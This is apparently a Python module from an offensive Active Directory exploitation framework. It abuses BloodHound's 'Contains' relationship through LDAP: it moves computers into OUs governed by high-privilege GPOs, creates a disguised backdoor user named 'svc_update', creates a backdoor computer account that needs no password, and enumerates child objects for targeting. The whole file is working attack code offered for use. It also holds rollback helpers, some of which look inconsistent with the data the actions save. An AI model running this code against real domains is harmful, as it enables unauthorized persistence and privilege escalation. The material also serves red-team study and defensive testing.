"""
Module: Contains
=================
Exploit the Contains BloodHound edge. The 'Contains' edge in
BloodHound indicates that a computer (or OU) contains another
object. This can be abused when you have GenericAll or GenericWrite
on the parent container, allowing you to move objects to a
different OU for GPO abuse, or to create/modify child objects.

The primary attack vector is:
  - Move a computer to a different OU where a high-privilege GPO applies
  - Create shadow objects or hijack existing child objects

BloodHound Edge: Contains
Attack Vector:   Object container abuse (move objects, OU manipulation)
Severity:        MEDIUM
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.contains")


class Contains(ExploitModule):
    """
    Exploit the Contains relationship between a parent container
    (typically an OU or computer) and its child objects.

    Primary attacks:
      1. Move a computer to a high-privilege GPO OU
      2. List children for further targeting
      3. Create a new child object (backdoor user/computer)
    """

    name: str            = "Contains"
    description: str     = (
        "Exploit the Contains edge by leveraging parent-child "
        "relationships in AD. Move objects to GPO-abusive OUs, "
        "enumerate child objects for targeting, or create "
        "backdoor child objects."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "Contains"
    severity: Severity   = Severity.MEDIUM
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#contains",
        "https://attack.mappings.mitre.org/technique/T1078/",
        "https://adsecurity.org/?p=2674",
        "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-active-directory-ou-design",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="parent",
            display_name="Parent Container",
            description="DN or name of the parent container (OU, computer, etc.).",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="action",
            display_name="Action",
            description="Action to perform.",
            required=True,
            default="enumerate_children",
            value_type=str,
            choices=[
                "enumerate_children",
                "move_object_here",
                "move_object_away",
                "create_backdoor_user",
                "create_backdoor_computer",
                "gpo_analysis",
            ],
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="object_to_move",
            display_name="Object to Move",
            description="DN or name of the object to move (move_object_* actions).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="destination_ou",
            display_name="Destination OU",
            description="DN of the destination OU (for move_object_away).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="backdoor_name",
            display_name="Backdoor Object Name",
            description="Name for the backdoor object to create.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="backdoor_password",
            display_name="Backdoor Password",
            description="Password for the backdoor user.",
            required=False,
            default=None,
            value_type=str,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_dn(self, name: str, domain: Optional[str]) -> Optional[str]:
        conn = self.connection
        if "," in name and "=" in name:
            return name
        search_base = self._get_search_base(domain)
        if not search_base:
            return None
        try:
            conn.search(
                search_base, f"(|(sAMAccountName={name})(cn={name}))",
                attributes=["distinguishedName"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed: %s", exc)
        return None

    def _enumerate_children(self, parent_dn: str) -> List[Dict[str, str]]:
        """List all direct child objects of a container."""
        conn = self.connection
        children = []
        try:
            conn.search(
                parent_dn,
                "(objectClass=*)",
                attributes=["distinguishedName", "objectClass", "sAMAccountName", "name"],
                search_scope=ldap3.LEVEL,
            )
            for entry in conn.entries:
                ocs = [str(c) for c in (entry.objectClass.values if hasattr(entry, "objectClass") else [])]
                sam = str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else ""
                children.append({
                    "dn": str(entry.distinguishedName),
                    "object_class": ocs,
                    "sam": sam,
                    "name": str(entry.name) if hasattr(entry, "name") else "",
                })
        except Exception as exc:
            self.logger.error("Child enumeration failed: %s", exc)
        return children

    def _enumerate_gpos_applied_to(self, dn: str) -> List[Dict[str, str]]:
        """Enumerate GPOs linked to an OU."""
        conn = self.connection
        gpos = []
        try:
            # GPOs linked to an OU are stored in the 'gPLink' attribute
            conn.search(dn, "(objectClass=*)", attributes=["gPLink"])
            if conn.entries and hasattr(conn.entries[0], "gPLink") and conn.entries[0].gPLink.values:
                for link in conn.entries[0].gPLink.values:
                    # gPLink format: [LDAP://cn={GUID},cn=policies,cn=system,DC=...;0]
                    gpos.append({"gplink": str(link)})
        except Exception as exc:
            self.logger.debug("GPO enumeration failed: %s", exc)
        return gpos

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        parent = self._opt("parent", kwargs)
        if not parent:
            return False, "Parent container is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        parent_name = self._opt("parent", kwargs)
        action = self._opt("action", kwargs) or "enumerate_children"
        domain = self._opt("domain", kwargs)

        parent_dn = self._resolve_dn(parent_name, domain)
        if not parent_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve parent container '{parent_name}'.",
            )

        self.logger.info("[Contains] Parent: %s | Action: %s", parent_dn, action)

        dispatch = {
            "enumerate_children":     self._action_enumerate_children,
            "move_object_here":       self._action_move_here,
            "move_object_away":       self._action_move_away,
            "create_backdoor_user":   self._action_create_backdoor_user,
            "create_backdoor_computer": self._action_create_backdoor_computer,
            "gpo_analysis":           self._action_gpo_analysis,
        }

        handler = dispatch.get(action)
        if not handler:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Unknown action: {action}",
            )

        return handler(parent_dn, domain, **kwargs)

    # ------------------------------------------------------------------ #
    # Actions
    # ------------------------------------------------------------------ #

    def _action_enumerate_children(
        self, parent_dn: str, domain: Optional[str], **kwargs
    ) -> ExploitOutput:
        """List all child objects and classify them for targeting."""
        children = self._enumerate_children(parent_dn)

        if not children:
            return ExploitOutput(
                success=True, result_type=ExploitResult.SUCCESS,
                message=f"No child objects found in '{parent_dn}'.",
                data={"parent_dn": parent_dn, "children": []},
            )

        # Classify children
        users = [c for c in children if "user" in c["object_class"]]
        groups = [c for c in children if "group" in c["object_class"]]
        computers = [c for c in children if "computer" in c["object_class"]]
        gmsas = [c for c in children if "msds-groupmanagedserviceaccount" in c["object_class"]]
        ous = [c for c in children if "organizationalunit" in c["object_class"]]

        return ExploitOutput(
            success=True, result_type=ExploitResult.SUCCESS,
            message=(
                f"Container '{parent_dn}' has {len(children)} children: "
                f"{len(users)} users, {len(groups)} groups, {len(computers)} "
                f"computers, {len(gmsas)} gMSAs, {len(ous)} OUs."
            ),
            data={
                "parent_dn": parent_dn,
                "children": children,
                "summary": {
                    "total": len(children),
                    "users": len(users),
                    "groups": len(groups),
                    "computers": len(computers),
                    "gmsas": len(gmsas),
                    "ous": len(ous),
                },
            },
        )

    def _action_move_here(
        self, parent_dn: str, domain: Optional[str], **kwargs
    ) -> ExploitOutput:
        """
        Move an object INTO this container. This is useful for placing
        a computer into an OU with a high-privilege GPO.
        """
        object_to_move = self._opt("object_to_move", kwargs)
        if not object_to_move:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="'object_to_move' is required for move_object_here.",
            )

        object_dn = self._resolve_dn(object_to_move, domain)
        if not object_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve object to move: '{object_to_move}'.",
            )

        self.logger.info("[Contains/Move] Moving '%s' → '%s'", object_dn, parent_dn)

        try:
            # LDAP modifyDN operation to move the object
            # Extract the RDN (last component) from the object's DN
            rdn = object_dn.split(",")[0]  # e.g. "CN=Workstation01"

            result = self.connection.modify_dn(
                object_dn,
                rdn,
                new_superior=parent_dn,
            )

            if result:
                new_dn = f"{rdn},{parent_dn}"
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Moved '{object_dn}' to '{new_dn}'.",
                    data={
                        "old_dn": object_dn,
                        "new_dn": new_dn,
                        "parent_dn": parent_dn,
                        "action": "move_here",
                    },
                    rollback_data={
                        "original_dn": object_dn,
                        "parent_dn": parent_dn,
                        "rdn": rdn,
                    },
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Move failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Move exception: {exc}",
            )

    def _action_move_away(
        self, parent_dn: str, domain: Optional[str], **kwargs
    ) -> ExploitOutput:
        """Move an object OUT of this container to a destination OU."""
        object_to_move = self._opt("object_to_move", kwargs)
        destination_ou = self._opt("destination_ou", kwargs)

        if not object_to_move:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="'object_to_move' is required.",
            )
        if not destination_ou:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="'destination_ou' is required for move_object_away.",
            )

        object_dn = self._resolve_dn(object_to_move, domain)
        dest_dn = self._resolve_dn(destination_ou, domain)

        if not object_dn or not dest_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="Cannot resolve object or destination.",
            )

        rdn = object_dn.split(",")[0]

        try:
            result = self.connection.modify_dn(
                object_dn, rdn, new_superior=dest_dn,
            )
            if result:
                new_dn = f"{rdn},{dest_dn}"
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Moved '{object_dn}' to '{new_dn}'.",
                    data={"old_dn": object_dn, "new_dn": new_dn},
                    rollback_data={
                        "original_dn": object_dn,
                        "original_parent": parent_dn,
                        "rdn": rdn,
                    },
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Move failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Move exception: {exc}",
            )

    def _action_create_backdoor_user(
        self, parent_dn: str, domain: Optional[str], **kwargs
    ) -> ExploitOutput:
        """Create a backdoor user account under this container."""
        name = self._opt("backdoor_name", kwargs) or "svc_update"
        password = self._opt("backdoor_password", kwargs)

        if not password:
            import secrets, string
            pool = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            password = "".join(secrets.choice(pool) for _ in range(20))

        self.logger.info("[Contains/CreateUser] Creating user '%s' under '%s'", name, parent_dn)

        try:
            from ldap3.utils.conv import escape_filter_chars

            encoded_pwd = ('"' + password + '"').encode("utf-16-le")

            result = self.connection.add(
                f"CN={escape_filter_chars(name)},{parent_dn}",
                attributes={
                    "objectClass": ["top", "person", "organizationalPerson", "user"],
                    "cn": name,
                    "sAMAccountName": name,
                    "userPrincipalName": f"{name}@{domain or 'domain.local'}",
                    "unicodePwd": encoded_pwd,
                    "userAccountControl": 512,  # NORMAL_ACCOUNT
                    "description": "Service account for updates",
                },
            )

            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Backdoor user '{name}' created. Password: {password}",
                    data={
                        "dn": f"CN={name},{parent_dn}",
                        "sam": name,
                        "password": password,
                        "action": "create_user",
                    },
                    rollback_data={
                        "dn": f"CN={name},{parent_dn}",
                        "action": "delete_object",
                    },
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"User creation failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"User creation exception: {exc}",
            )

    def _action_create_backdoor_computer(
        self, parent_dn: str, domain: Optional[str], **kwargs
    ) -> ExploitOutput:
        """Create a backdoor computer object under this container."""
        name = self._opt("backdoor_name", kwargs) or "EVILPC01"

        self.logger.info("[Contains/CreateComputer] Creating computer '%s' under '%s'", name, parent_dn)

        try:
            from ldap3.utils.conv import escape_filter_chars

            result = self.connection.add(
                f"CN={escape_filter_chars(name)},{parent_dn}",
                attributes={
                    "objectClass": ["top", "person", "organizationalPerson", "user", "computer"],
                    "cn": name,
                    "sAMAccountName": f"{name}$",
                    "userAccountControl": 4128,  # WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD
                    "dnsHostName": f"{name}.{domain or 'domain.local'}",
                    "description": "Workstation",
                },
            )

            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Backdoor computer '{name}$' created.",
                    data={
                        "dn": f"CN={name},{parent_dn}",
                        "sam": f"{name}$",
                        "action": "create_computer",
                    },
                    rollback_data={
                        "dn": f"CN={name},{parent_dn}",
                        "action": "delete_object",
                    },
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Computer creation failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Computer creation exception: {exc}",
            )

    def _action_gpo_analysis(
        self, parent_dn: str, domain: Optional[str], **kwargs
    ) -> ExploitOutput:
        """
        Analyze GPOs linked to this container. Moving a computer here
        would subject it to these GPOs.
        """
        gpo_links = self._enumerate_gpos_applied_to(parent_dn)
        children = self._enumerate_children(parent_dn)

        computers = [c for c in children if "computer" in c["object_class"]]

        return ExploitOutput(
            success=True, result_type=ExploitResult.SUCCESS,
            message=(
                f"GPO analysis for '{parent_dn}': "
                f"{len(gpo_links)} GPO(s) linked, "
                f"{len(computers)} computer(s) affected."
            ),
            data={
                "parent_dn": parent_dn,
                "gpo_links": gpo_links,
                "affected_computers": computers,
            },
        )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        action = kwargs.get("action")
        if action == "delete_object":
            dn = kwargs.get("dn")
            if dn:
                try:
                    self.connection.delete(dn)
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SUCCESS,
                        message=f"Deleted '{dn}'.",
                    )
                except Exception as exc:
                    return ExploitOutput(
                        success=False, result_type=ExploitResult.ERROR,
                        message=f"Delete failed: {exc}",
                    )
        elif action == "move_back":
            original_dn = kwargs.get("original_dn")
            rdn = kwargs.get("rdn")
            original_parent = kwargs.get("original_parent")
            if original_dn and rdn and original_parent:
                try:
                    self.connection.modify_dn(
                        f"{rdn},{kwargs.get('current_parent', '')}",
                        rdn, new_superior=original_parent,
                    )
                    return ExploitOutput(
                        success=True, result_type=ExploitResult.SUCCESS,
                        message=f"Object moved back to original location.",
                    )
                except Exception as exc:
                    return ExploitOutput(
                        success=False, result_type=ExploitResult.ERROR,
                        message=f"Move back failed: {exc}",
                    )

        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not supported for this action.",
        )
